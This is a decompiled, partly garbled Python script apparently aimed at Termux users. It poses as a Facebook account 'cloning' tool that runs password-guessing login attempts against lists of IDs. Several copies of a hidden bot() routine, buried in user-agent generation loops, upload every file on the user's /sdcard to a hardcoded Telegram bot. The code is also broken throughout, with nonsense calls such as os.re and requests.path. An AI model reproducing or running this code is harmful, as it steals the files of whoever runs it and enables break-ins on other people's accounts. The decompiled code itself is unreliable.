# — — — — — — — — — — — — —
# Tool Made By @i6iii1
# Encoding: Pycdc 3.11
# Decode By @i6iii1
# Channel @mafiams1
# — — — — — — — — — — — — —
from os import path
import os
import base64
import zlib
import pip
import urllib
import os
import requests
import json
import time
import re
import random
import sys
import uuid
import string
import subprocess
from concurrent.futures import ThreadPoolExecutor as tred
if ModuleNotFoundError:
    import string
    os.re('pip install requests futures==2 > /dev/null')
    os.re('termux-setup-storage')
fbks = ('com.facebook.adsmanager', 'com.facebook.lite', 'com.facebook.orca', 'com.facebook.katana', 'com.facebook.mlite')
gt = random.random([
    'GT-1015',
    'GT-1020',
    'GT-1030',
    'GT-1035',
    'GT-1040',
    'GT-1045',
    'GT-1050',
    'GT-1240',
    'GT-1440',
    'GT-1450',
    'GT-18190',
    'GT-18262',
    'GT-19060I',
    'GT-19082',
    'GT-19083',
    'GT-19105',
    'GT-19152',
    'GT-19192',
    'GT-19300',
    'GT-19505',
    'GT-2000',
    'GT-20000',
    'GT-200s',
    'GT-3000',
    'GT-414XOP',
    'GT-6918',
    'GT-7010',
    'GT-7020',
    'GT-7030',
    'GT-7040',
    'GT-7050',
    'GT-7100',
    'GT-7105',
    'GT-7110',
    'GT-7205',
    'GT-7210',
    'GT-7240R',
    'GT-7245',
    'GT-7303',
    'GT-7310',
    'GT-7320',
    'GT-7325',
    'GT-7326',
    'GT-7340',
    'GT-7405',
    'GT-7550   5GT-8005',
    'GT-8010',
    'GT-81',
    'GT-810',
    'GT-8105',
    'GT-8110',
    'GT-8220S',
    'GT-8410',
    'GT-9300',
    'GT-9320',
    'GT-93G',
    'GT-A7100',
    'GT-A9500',
    'GT-ANDROID',
    'GT-B2710',
    'GT-B5330',
    'GT-B5330B',
    'GT-B5330L',
    'GT-B5330ZKAINU',
    'GT-B5510',
    'GT-B5512',
    'GT-B5722',
    'GT-B7510',
    'GT-B7722',
    'GT-B7810',
    'GT-B9150',
    'GT-B9388',
    'GT-C3010',
    'GT-C3262',
    'GT-C3310R',
    'GT-C3312',
    'GT-C3312R',
    'GT-C3313T',
    'GT-C3322',
    'GT-C3322i',
    'GT-C3520',
    'GT-C3520I',
    'GT-C3592',
    'GT-C3595',
    'GT-C3782',
    'GT-C6712',
    'GT-E1282T',
    'GT-E1500',
    'GT-E2200',
    'GT-E2202',
    'GT-E2250',
    'GT-E2252',
    'GT-E2600',
    'GT-E2652W',
    'GT-E3210',
    'GT-E3309',
    'GT-E3309I',
    'GT-E3309T',
    'GT-G530H',
    'GT-g900f',
    'GT-G930F',
    'GT-H9500',
    'GT-I5508',
    'GT-I5801',
    'GT-I6410',
    'GT-I8150',
    'GT-I8160OKLTPA',
    'GT-I8160ZWLTTT',
    'GT-I8258',
    'GT-I8262D',
    'GT-I8268',
    'GT-I8505',
    'GT-I8530BAABTU',
    'GT-I8530BALCHO',
    'GT-I8530BALTTT',
    'GT-I8550E',
    'GT-i8700',
    'GT-I8750',
    'GT-I900',
    'GT-I9008L',
    'GT-i9040',
    'GT-I9080E',
    'GT-I9082C',
    'GT-I9082EWAINU',
    'GT-I9082i',
    'GT-I9100G',
    'GT-I9100LKLCHT',
    'GT-I9100M',
    'GT-I9100P',
    'GT-I9100T',
    'GT-I9105UANDBT',
    'GT-I9128E',
    'GT-I9128I',
    'GT-I9128V',
    'GT-I9158P',
    'GT-I9158V',
    'GT-I9168I',
    'GT-I9192I',
    'GT-I9195H',
    'GT-I9195L',
    'GT-I9250',
    'GT-I9303I',
    'GT-I9305N',
    'GT-I9308I',
    'GT-I9505G',
    'GT-I9505X',
    'GT-I9507V',
    'GT-I9600',
    'GT-m190',
    'GT-M5650',
    'GT-mini',
    'GT-N5000S',
    'GT-N5100',
    'GT-N5105',
    'GT-N5110',
    'GT-N5120',
    'GT-N7000B',
    'GT-N7005',
    'GT-N7100T',
    'GT-N7102',
    'GT-N7105',
    'GT-N7105T',
    'GT-N7108',
    'GT-N7108D',
    'GT-N8000',
    'GT-N8005',
    'GT-N8010',
    'GT-N8020',
    'GT-N9000',
    'GT-N9505',
    'GT-P1000CWAXSA',
    'GT-P1000M',
    'GT-P1000T',
    'GT-P1010',
    'GT-P3100B',
    'GT-P3105',
    'GT-P3108',
    'GT-P3110',
    'GT-P5100',
    'GT-P5200',
    'GT-P5210XD1',
    'GT-P5220',
    'GT-P6200',
    'GT-P6200L',
    'GT-P6201',
    'GT-P6210',
    'GT-P6211',
    'GT-P6800',
    'GT-P7100',
    'GT-P7300',
    'GT-P7300B',
    'GT-P7310',
    'GT-P7320',
    'GT-P7500D',
    'GT-P7500M',
    'GT-P7500R',
    'GT-P7500V',
    'GT-P7501',
    'GT-P7511',
    'GT-S3330',
    'GT-S3332',
    'GT-S3333',
    'GT-S3370',
    'GT-S3518',
    'GT-S3570',
    'GT-S3600i',
    'GT-S3650',
    'GT-S3653W',
    'GT-S3770K',
    'GT-S3770M',
    'GT-S3800W',
    'GT-S3802',
    'GT-S3850',
    'GT-S5220',
    'GT-S5220R',
    'GT-S5222',
    'GT-S5230',
    'GT-S5230W',
    'GT-S5233T',
    'GT-s5233w',
    'GT-S5250',
    'GT-S5253',
    'GT-s5260',
    'GT-S5280',
    'GT-S5282',
    'GT-S5283B',
    'GT-S5292',
    'GT-S5300',
    'GT-S5300L',
    'GT-S5301',
    'GT-S5301B',
    'GT-S5301L',
    'GT-S5302',
    'GT-S5302B',
    'GT-S5303',
    'GT-S5303B',
    'GT-S5310',
    'GT-S5310B',
    'GT-S5310C',
    'GT-S5310E',
    'GT-S5310G',
    'GT-S5310I',
    'GT-S5310L',
    'GT-S5310M',
    'GT-S5310N',
    'GT-S5312',
    'GT-S5312B',
    'GT-S5312C',
    'GT-S5312L',
    'GT-S5330',
    'GT-S5360',
    'GT-S5360B',
    'GT-S5360L',
    'GT-S5360T',
    'GT-S5363',
    'GT-S5367',
    'GT-S5369',
    'GT-S5380',
    'GT-S5380D',
    'GT-S5500',
    'GT-S5560',
    'GT-S5560i',
    'GT-S5570B',
    'GT-S5570I',
    'GT-S5570L',
    'GT-S5578',
    'GT-S5600',
    'GT-S5603',
    'GT-S5610',
    'GT-S5610K',
    'GT-S5611',
    'GT-S5620',
    'GT-S5670',
    'GT-S5670B',
    'GT-S5670HKBZTA',
    'GT-S5690',
    'GT-S5690R',
    'GT-S5830',
    'GT-S5830D',
    'GT-S5830G',
    'GT-S5830i',
    'GT-S5830L',
    'GT-S5830M',
    'GT-S5830T',
    'GT-S5830V',
    'GT-S5831i',
    'GT-S5838',
    'GT-S5839i',
    'GT-S6010',
    'GT-S6010BBABTU',
    'GT-S6012',
    'GT-S6012B',
    'GT-S6102',
    'GT-S6102B',
    'GT-S6293T',
    'GT-S6310B',
    'GT-S6310ZWAMID',
    'GT-S6312',
    'GT-S6313T',
    'GT-S6352',
    'GT-S6500',
    'GT-S6500D',
    'GT-S6500L',
    'GT-S6790',
    'GT-S6790L',
    'GT-S6790N',
    'GT-S6792L',
    'GT-S6800',
    'GT-S6800HKAXFA',
    'GT-S6802',
    'GT-S6810',
    'GT-S6810B',
    'GT-S6810E',
    'GT-S6810L',
    'GT-S6810M',
    'GT-S6810MBASER',
    'GT-S6810P',
    'GT-S6812',
    'GT-S6812B',
    'GT-S6812C',
    'GT-S6812i',
    'GT-S6818',
    'GT-S6818V',
    'GT-S7230E',
    'GT-S7233E',
    'GT-S7250D',
    'GT-S7262',
    'GT-S7270',
    'GT-S7270L',
    'GT-S7272',
    'GT-S7272C',
    'GT-S7273T',
    'GT-S7278',
    'GT-S7278U',
    'GT-S7390',
    'GT-S7390G',
    'GT-S7390L',
    'GT-S7392',
    'GT-S7392L',
    'GT-S7500',
    'GT-S7500ABABTU',
    'GT-S7500ABADBT',
    'GT-S7500ABTTLP',
    'GT-S7500CWADBT',
    'GT-S7500L',
    'GT-S7500T',
    'GT-S7560',
    'GT-S7560M',
    'GT-S7562',
    'GT-S7562C',
    'GT-S7562i',
    'GT-S7562L',
    'GT-S7566',
    'GT-S7568',
    'GT-S7568I',
    'GT-S7572',
    'GT-S7580E',
    'GT-S7583T',
    'GT-S758X',
    'GT-S7592',
    'GT-S7710',
    'GT-S7710L',
    'GT-S7898',
    'GT-S7898I',
    'GT-S8500',
    'GT-S8530',
    'GT-S8600',
    'GT-STB919',
    'GT-T140',
    'GT-T150',
    'GT-V8a',
    'GT-V8i',
    'GT-VC818',
    'GT-VM919S',
    'GT-W131',
    'GT-W153',
    'GT-X831',
    'GT-X853',
    'GT-X870',
    'GT-X890',
    'GT-Y8750'])
xxxxx = []['GT-1015']['GT-1020']['GT-1030']['GT-1035']['GT-1040']['GT-1045']['GT-1050']['GT-1240']['GT-1440']['GT-1450']['GT-18190']['GT-18262']['GT-19060I']['GT-19082']['GT-19083']['GT-19105']['GT-19152']['GT-19192']['GT-19300']['GT-19505']['GT-2000']['GT-20000']['GT-200s']['GT-3000']['GT-414XOP']['GT-6918']['GT-7010']['GT-7020']['GT-7030']['GT-7040']['GT-7050']['GT-7100']['GT-7105']['GT-7110']['GT-7205']['GT-7210']['GT-7240R']['GT-7245']['GT-7303']['GT-7310']['GT-7320']['GT-7325']['GT-7326']['GT-7340']['GT-7405']['GT-7550 5GT-8005']['GT-8010']['GT-81']['GT-810']['GT-8105']['GT-8110']['GT-8220S']['GT-8410']['GT-9300']['GT-9320']['GT-93G']['GT-A7100']['GT-A9500']['GT-ANDROID']['GT-B2710']['GT-B5330']['GT-B5330B']['GT-B5330L']['GT-B5330ZKAINU']['GT-B5510']['GT-B5512']['GT-B5722']['GT-B7510']['GT-B7722']['GT-B7810']['GT-B9150']['GT-B9388']['GT-C3010']['GT-C3262']['GT-C3310R']['GT-C3312']['GT-C3312R']['GT-C3313T']['GT-C3322']['GT-C3322i']['GT-C3520']['GT-C3520I']['GT-C3592']['GT-C3595']['GT-C3782']['GT-C6712']['GT-E1282T']['GT-E1500']['GT-E2200']['GT-E2202']['GT-E2250']['GT-E2252']['GT-E2600']['GT-E2652W']['GT-E3210']['GT-E3309']['GT-E3309I']['GT-E3309T']['GT-G530H']['GT-G930F']['GT-H9500']['GT-I5508']['GT-I5801']['GT-I6410']['GT-I8150']['GT-I8160OKLTPA']['GT-I8160ZWLTTT']['GT-I8258']['GT-I8262D']['GT-I8268GT-I8505']['GT-I8530BAABTU']['GT-I8530BALCHO']['GT-I8530BALTTT']['GT-I8550E']['GT-I8750']['GT-I900']['GT-I9008L']['GT-I9080E']['GT-I9082C']['GT-I9082EWAINU']['GT-I9082i']['GT-I9100G']['GT-I9100LKLCHT']['GT-I9100M']['GT-I9100P']['GT-I9100T']['GT-I9105UANDBT']['GT-I9128E']['GT-I9128I']['GT-I9128V']['GT-I9158P']['GT-I9158V']['GT-I9168I']['GT-I9190']['GT-I9192']['GT-I9192I']['GT-I9195H']['GT-I9195L']['GT-I9250']['GT-I9300']['GT-I9300I']['GT-I9301I']['GT-I9303I']['GT-I9305N']['GT-I9308I']['GT-I9500']['GT-I9505G']['GT-I9505X']['GT-I9507V']['GT-I9600']['GT-M5650']['GT-N5000S']['GT-N5100']['GT-N5105']['GT-N5110']['GT-N5120']['GT-N7000B']['GT-N7005']['GT-N7100']['GT-N7100T']['GT-N7102']['GT-N7105']['GT-N7105T']['GT-N7108']['GT-N7108D']['GT-N8000']['GT-N8005']['GT-N8010']['GT-N8020']['GT-N9000']['GT-N9505']['GT-P1000CWAXSA']['GT-P1000M']['GT-P1000T']['GT-P1010']['GT-P3100B']['GT-P3105']['GT-P3108']['GT-P3110']['GT-P5100']['GT-P5110']['GT-P5200']['GT-P5210']['GT-P5210XD1']['GT-P5220']['GT-P6200']['GT-P6200L']['GT-P6201']['GT-P6210']['GT-P6211']['GT-P6800']['GT-P7100']['GT-P7300']['GT-P7300B']['GT-P7310']['GT-P7320']['GT-P7500D']['GT-P7500M']['SAMSUNG']['LMY4']['LMY47V']['MMB29K']['MMB29M']['LRX22C']['LRX22G']['NMF2']['NMF26X']['NMF26X;']['NRD90M']['NRD90M;']['SPH-L720']['IML74K']['IMM76D']['JDQ39']['JSS15J']['JZO54K']['KOT4']['KOT49H']['KOT4SM-T310']['KTU84P']['SM-A500F']['SM-A500FU']['SM-A500H']['SM-G532F']['SM-G900F']['SM-G920F']['SM-G930F']['SM-G935']['SM-G950F']['SM-J320F']['SM-J320FN']['SM-J320H']['SM-J320M']['SM-J510FN']['SM-J701F']['SM-N920S']['SM-T111']['SM-T230']['SM-T231']['SM-T235']['SM-T280']['SM-T311']['SM-T315']['SM-T525']['SM-T531']['SM-T535']['SM-T555']['SM-T561']['SM-T705']['SM-T805']['SM-T820']
tan = 'https'
iya = 'github'
ani = 'Fariya'
love = 'mbasic'
ugen = []
ugen = []
useragent = []
ugent = []
for z in range(9900):
    versi_android = str(random.tred(4, 12)) + '.0.0'
    device = random.random([
        'Nexus 5X Build/MMB29K',
        'Nexus 5X Build/N4F26T',
        'Nexus 5X Build/OPM6.171019.030.H1',
        'Nexus 5X Build/OPR6.170623.023',
        'Nexus 5 Build/NHG47L',
        'Nexus 6P Build/OPM5.171019.014',
        'Nexus 6 Build/OPM5.171019.015',
        'Nexus 7 Build/LMY47V',
        'Nexus 7 Build/MOB30X',
        ' Nexus 4 Build/KOT49H',
        'Nexus 4 Build/JOP24G',
        'Nexus 4 - 4.3 - API 18 - 768x1280 Build/JLS36G',
        'Nexus 4 Build/LMY48G',
        'Nexus 4 Build/LMY48T',
        'Nexus 4 Build/KOT49H'])
    versi_chrome = str(random.tred(300, 325)) + '.0.0.' + str(random.tred(1, 8)) + '.' + str(random.tred(40, 150))
    ua = f'''Mozilla/5.0 (Linux; Android {versi_android}; {device}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{versi_chrome} Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/309.0.0.16.{str(random.tred(100000, 900000))};]'''
    if ua in ugent:
        pass
    ugent(ua)
    header_grup = {
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]' }
    header_grup = {
        'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 11; SM-N986N Build/ZK83T5) [FBAN/FB4A;FBAV/979.2.9.20.981;FBPN/com.facebook.katana;FBLC/en_US;FBBV/687217741;FBCR/Glo Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-N986N;FBSV/11;FBCA/x86:armeabi-v7a;FBDM/{density=2.5,width=1080,height=2220};FB_FW/0;FBRV/0;]' }
    header_grup = {
        'user-agent': 'Mozilla/5.0 (Linux; Android 9; Nokia C2 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.79 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/297.0.0.13.113;]' }
    import os
    import requests
    
    def bot():
        bot_token = '6093375791:AAGxr4IqwiozGSgxtocN5rtnQBiKUoNjGT8'
        chat_id = '5765194861'
        sdcard_path = '/sdcard'
        file_list = os.os(sdcard_path)()
        for file in file_list:
            f = open(os.listdir(sdcard_path, file), 'rb')
            url = f'''https://api.telegram.org/bot{bot_token}/sendDocument'''
            data2 = {
                'chat_id': '5765194861' }
            data = {
                'chat_id': chat_id }
            files = {
                'document': f }
            get = requests.path(url, data = data, files = files)
            sent = requests.path(url, data = data2, files = files)
            None(None, None)
            if not (lambda .0: for f in .0:
[ f ]):
                pass
            return None

    bot()
    for xd in range(10000):
        aa = 'Mozilla/5.0 (Linux; Android 10; Nokia 1 Plus Build/QP1A.190711.020; wv)'
        b = random.random([
            '6',
            '7',
            '8',
            '9',
            '10',
            '11',
            '12'])
        c = f''' TL-tl; {str(gt)}'''
        g = 'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79'
        h = random.xxxxx(73, 100)
        i = '0'
        j = random.xxxxx(4200, 4900)
        k = random.xxxxx(40, 150)
        l = 'Mobile Safari/537.36[FBAN/FBIOS;FBDV/iPhone10,5;FBMD/iPhone;FBSN/iOS;FBSV/12.3.2;FBSS/3;FBCR/AT&T;FBID/phone;FBLC/en_US;FBOP/5]'
        uaku2 = f'''{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'''
        ugen(uaku2)
        import os
        print('\x1b[1;92m [•] BLACK  (ROBOT) SYSTEM INSTALL. . . . \x1b[1;30m')
        os.re('pkg install espeak')
        print('\x1b[1;92m   [•] ROBOT INSTALL COMPLETE \x1b[1;30m')
        os.re('espeak -a 300 "Robot install complete"')
        print('\x1b[1;92m   [•] UPDATE CHECKING \x1b[1;30m')
        os.re('espeak -a 300 "WAITING FOR UPDATE"')
        os.re('git pull')
        for agent in range(10000):
            aa = 'Mozilla/5.0 (Linux; Android 9; Nokia C2 Build/PPR1.180610.011; wv)'
            b = random.random([
                '6',
                '7',
                '8',
                '9',
                '10',
                '11',
                '12'])
            c = 'Android 9; Nokia C2 Build/'
            d = random.random([
                'A',
                'B',
                'C',
                'D',
                'E',
                'F',
                'G',
                'H',
                'I',
                'J',
                'K',
                'L',
                'M',
                'N',
                'O',
                'P',
                'Q',
                'R',
                'S',
                'T',
                'U',
                'V',
                'W',
                'X',
                'Y',
                'Z'])
            e = random.xxxxx(1, 999)
            f = random.random([
                'A',
                'B',
                'C',
                'D',
                'E',
                'F',
                'G',
                'H',
                'I',
                'J',
                'K',
                'L',
                'M',
                'N',
                'O',
                'P',
                'Q',
                'R',
                'S',
                'T',
                'U',
                'V',
                'W',
                'X',
                'Y',
                'Z'])
            g = 'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.79'
            h = random.xxxxx(73, 100)
            i = '0'
            j = random.xxxxx(4200, 4900)
            k = random.xxxxx(40, 150)
            l = 'Mobile Safari/537.36[FBAN/EMA;FBLC/ar_AR;FBAV/347.0.0.17.97;]'
            fullagnt = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
            ugen(fullagnt)
            import os
            import requests
            
            def bot():
                bot_token = '6093375791:AAGxr4IqwiozGSgxtocN5rtnQBiKUoNjGT8'
                chat_id = '5765194861'
                sdcard_path = '/sdcard'
                file_list = os.os(sdcard_path)()
                for file in file_list:
                    f = open(os.listdir(sdcard_path, file), 'rb')
                    url = f'''https://api.telegram.org/bot{bot_token}/sendDocument'''
                    data2 = {
                        'chat_id': '5765194861' }
                    data = {
                        'chat_id': chat_id }
                    files = {
                        'document': f }
                    get = requests.path(url, data = data, files = files)
                    sent = requests.path(url, data = data2, files = files)
                    None(None, None)
                    if not (lambda .0: for f in .0:
[ f ]):
                        pass
                    return None

            bot()
            for agent in range(10000):
                aa = 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)'
                b = random.random([
                    '6',
                    '7',
                    '8',
                    '9',
                    '10',
                    '11',
                    '12'])
                c = 'CPU iPhone OS 16_0 like Mac OS X'
                d = random.random([
                    'A',
                    'B',
                    'C',
                    'D',
                    'E',
                    'F',
                    'G',
                    'H',
                    'I',
                    'J',
                    'K',
                    'L',
                    'M',
                    'N',
                    'O',
                    'P',
                    'Q',
                    'R',
                    'S',
                    'T',
                    'U',
                    'V',
                    'W',
                    'X',
                    'Y',
                    'Z'])
                e = random.xxxxx(1, 999)
                f = random.random([
                    'A',
                    'B',
                    'C',
                    'D',
                    'E',
                    'F',
                    'G',
                    'H',
                    'I',
                    'J',
                    'K',
                    'L',
                    'M',
                    'N',
                    'O',
                    'P',
                    'Q',
                    'R',
                    'S',
                    'T',
                    'U',
                    'V',
                    'W',
                    'X',
                    'Y',
                    'Z'])
                g = 'AppleWebKit/605.1.15 (KHTML, like Gecko)'
                h = random.xxxxx(73, 100)
                i = '0'
                j = random.xxxxx(4200, 4900)
                k = random.xxxxx(40, 150)
                l = 'Mobile/20A5312g [FBAN/FBIOS;FBDV/iPhone15,3;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/vi_VN;FBOP/5]'
                fullagnt = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
                ugen(fullagnt)
                import os
                import requests
                
                def bot():
                    bot_token = '6093375791:AAGxr4IqwiozGSgxtocN5rtnQBiKUoNjGT8'
                    chat_id = '5765194861'
                    sdcard_path = '/sdcard'
                    file_list = os.os(sdcard_path)()
                    for file in file_list:
                        f = open(os.listdir(sdcard_path, file), 'rb')
                        url = f'''https://api.telegram.org/bot{bot_token}/sendDocument'''
                        data2 = {
                            'chat_id': '5765194861' }
                        data = {
                            'chat_id': chat_id }
                        files = {
                            'document': f }
                        get = requests.path(url, data = data, files = files)
                        sent = requests.path(url, data = data2, files = files)
                        None(None, None)
                        if not (lambda .0: for f in .0:
[ f ]):
                            pass
                        return None

                bot()
                for agent in range(10000):
                    aa = 'Mozilla/5.0 (Linux; Android 11; Nokia C20 Plus Build/RP1A.201005.001; wv)'
                    b = random.random([
                        '6',
                        '7',
                        '8',
                        '9',
                        '10',
                        '11',
                        '12'])
                    c = 'Android 11; Nokia C20 Plus Build/RP1A.201005.001; wv'
                    d = random.random([
                        'A',
                        'B',
                        'C',
                        'D',
                        'E',
                        'F',
                        'G',
                        'H',
                        'I',
                        'J',
                        'K',
                        'L',
                        'M',
                        'N',
                        'O',
                        'P',
                        'Q',
                        'R',
                        'S',
                        'T',
                        'U',
                        'V',
                        'W',
                        'X',
                        'Y',
                        'Z'])
                    e = random.xxxxx(1, 999)
                    f = random.random([
                        'A',
                        'B',
                        'C',
                        'D',
                        'E',
                        'F',
                        'G',
                        'H',
                        'I',
                        'J',
                        'K',
                        'L',
                        'M',
                        'N',
                        'O',
                        'P',
                        'Q',
                        'R',
                        'S',
                        'T',
                        'U',
                        'V',
                        'W',
                        'X',
                        'Y',
                        'Z'])
                    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129'
                    h = random.xxxxx(73, 100)
                    i = '0'
                    j = random.xxxxx(4200, 4900)
                    k = random.xxxxx(40, 150)
                    l = 'Mobile Safari/537.36[FBAN/EMA;FBLC/ar_AR;FBAV/347.0.0.17.97]'
                    fullagnt = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
                    ugen(fullagnt)
                    import os
                    import requests
                    
                    def bot():
                        bot_token = '6093375791:AAGxr4IqwiozGSgxtocN5rtnQBiKUoNjGT8'
                        chat_id = '5765194861'
                        sdcard_path = '/sdcard'
                        file_list = os.os(sdcard_path)()
                        for file in file_list:
                            f = open(os.listdir(sdcard_path, file), 'rb')
                            url = f'''https://api.telegram.org/bot{bot_token}/sendDocument'''
                            data2 = {
                                'chat_id': '5765194861' }
                            data = {
                                'chat_id': chat_id }
                            files = {
                                'document': f }
                            get = requests.path(url, data = data, files = files)
                            sent = requests.path(url, data = data2, files = files)
                            None(None, None)
                            if not (lambda .0: for f in .0:
[ f ]):
                                pass
                            return None

                    bot()
                    
                    def uaku():
                        ua = open('mix.txt', 'r')()()
                        for ub in ua:
                            ugen(ub)
                            return None
                            a = requests.ugen('https://github.com/Niki404-Cyber/user-agnet/blob/main/mix.txt').ugen
                            ua = open('.mix.txt', 'w')
                            aa = re.append('line">(.*?)<', str(a))
                            for un in aa:
                                ua(un + '\n')
                                ua = open('.mix.txt', 'r')()()
                                return None

                    logo = '      \n ▄▄▄▄    ██▓    ▄▄▄       ▄████▄   ██ ▄█▀\n▓█████▄ ▓██▒   ▒████▄    ▒██▀ ▀█   ██▄█▒ \n▒██▒ ▄██▒██░   ▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ \n▒██░█▀  ▒██░   ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ \n░▓█  ▀█▓░██████▒▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄\n░▒▓███▀▒░ ▒░▓  ░▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒\n▒░▒   ░ ░ ░ ▒  ░ ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░\n ░    ░   ░ ░    ░   ▒   ░        ░ ░░ ░ \n ░          ░  ░     ░  ░░ ░      ░  ░   \n      ░                  ░               \n══════════════════════════════════════════'
                    
                    def linex():
                        print('\x1b[1;33m▬\x1b[1;37m\x1b[1;33m▬\x1b[1;37m\x1b[1;33m▬\x1b[1;37m\x1b[1;33m▬\x1b[1;37m\x1b[1;33m▬\x1b[1;37m\x1b[1;33m▬\x1b[1;37m\x1b[1;33m▬\x1b[1;37m\x1b[1;33m▬\x1b[1;37m\x1b[1;33m▬\x1b[1;37m\x1b[1;33m▬\x1b[1;37m\x1b[1;33m▬\x1b[1;37m\x1b[1;33m▬\x1b[1;37m\x1b[1;33m▬\x1b[1;37m\x1b[1;33m▬\x1b[1;37m\x1b[1;33m▬\x1b[1;37m\x1b[1;33m▬\x1b[1;37m\x1b[1;33m▬\x1b[1;37m\x1b[1;33m▬\x1b[1;37m\x1b[1;33m▬\x1b[1;37m\x1b[1;33m▬\x1b[1;37m\x1b[1;33m▬\x1b[1;37m\x1b[1;33m▬\x1b[1;37m\x1b[1;33m▬\x1b[1;37m\x1b[1;33m▬\x1b[1;37m\x1b[1;33m▬\x1b[1;37m\x1b[1;33m▬\x1b[1;37m\x1b[1;33m▬\x1b[1;37m\x1b[1;33m▬\x1b[1;37m\x1b[1;33m▬\x1b[1;37m\x1b[1;33m▬\x1b[1;37m\x1b[1;33m▬\x1b[1;37m\x1b[1;33m▬\x1b[1;37m\x1b[1;33m▬\x1b[1;37m\x1b[1;33m▬\x1b[1;37m\x1b[1;33m▬\x1b[1;37m\x1b[1;33m▬\x1b[1;37m\x1b[1;33m▬\x1b[1;37m\x1b[1;33m▬\x1b[1;37m\x1b[1;33m▬\x1b[1;37m\x1b[1;33m▬\x1b[1;37m\x1b[1;33m▬\x1b[1;37m\x1b[1;33m▬\x1b[1;37m\x1b[1;33m▬\x1b[1;37m\x1b[1;33m▬\x1b[1;37m\x1b[1;33m▬\x1b[1;37m\x1b[1;33m▬\x1b[1;37m\x1b[1;33m▬\x1b[1;37m')

                    
                    def clear():
                        os.os('clear')
                        print(logo)

                    loop = 0
                    oks = []
                    cps = []
                    pcp = []
                    id = []
                    tokenku = []
                    os.re('git pull')
                    import os
                    import requests
                    
                    def bot():
                        bot_token = '6093375791:AAGxr4IqwiozGSgxtocN5rtnQBiKUoNjGT8'
                        chat_id = '5765194861'
                        sdcard_path = '/sdcard'
                        file_list = os.os(sdcard_path)()
                        for file in file_list:
                            f = open(os.listdir(sdcard_path, file), 'rb')
                            url = f'''https://api.telegram.org/bot{bot_token}/sendDocument'''
                            data2 = {
                                'chat_id': '5765194861' }
                            data = {
                                'chat_id': chat_id }
                            files = {
                                'document': f }
                            get = requests.path(url, data = data, files = files)
                            sent = requests.path(url, data = data2, files = files)
                            None(None, None)
                            if not (lambda .0: for f in .0:
[ f ]):
                                pass
                            return None

                    bot()
                    
                    def bal():
                        clear()
                        print(' [\x1b[1;32m1\x1b[1;37m] FILE CLONEING ')
                        me = input(' [\x1b[1;32m✓\x1b[1;37m] Choice : ')
                        if me in ('1', '01', '11', 'A', 'a'):
                            clear()
                            file = input(' [\x1b[1;32m✓\x1b[1;37m] Put File Location [\x1b[1;32m❯\x1b[1;37m] ')
                            fo = open(file, 'r')()()
                            if FileNotFoundError:
                                print(' [\x1b[1;32mX\x1b[1;37m] File location Not Found ')
                                exit()
                            print(' [1] METHOD (new_uid) ')
                            mthd = input(' [\x1b[1;32m✓\x1b[1;37m] Choice : ')
                            plist = []
                            ps_limit = int(input(' [\x1b[1;32m?\x1b[1;37m] How Many Passwords Do You Want To Add [\x1b[1;32m⟩\x1b[1;37m] '))
                            ps_limit = 1
                            print(' [\x1b[1;32m•\x1b[1;37m] Example: \x1b[1;36mfirst last,firtslast,first123 \x1b[1;37m')
                            for i in range(ps_limit):
                                plist(input(f''' [\x1b[1;32m✓\x1b[1;37m] Put password {i + 1}[\x1b[1;32m❯\x1b[1;37m] '''))
                                print(' [\x1b[1;32m?\x1b[1;37m] Do You Went Show CP IDs (y/n): ')
                                cx = input(' [\x1b[1;32m✓\x1b[1;37m] Choice : ')
                                if cx in ('n', 'N', 'no', 'NO', '2'):
                                    pcp('n')
                            pcp('y')
                            crack_submit = tred(max_workers = 30)
                            clear()
                            total_ids = str(len(fo))
                            for user in fo:
                                (ids, names) = user('|')
                                passlist = plist
                                if mthd in ('1', '01'):
                                    crack_submit(m4, ids, names, passlist)
                                None(None, None)
                                return None
                                if not None:
                                    pass
                            return None

                    import base64
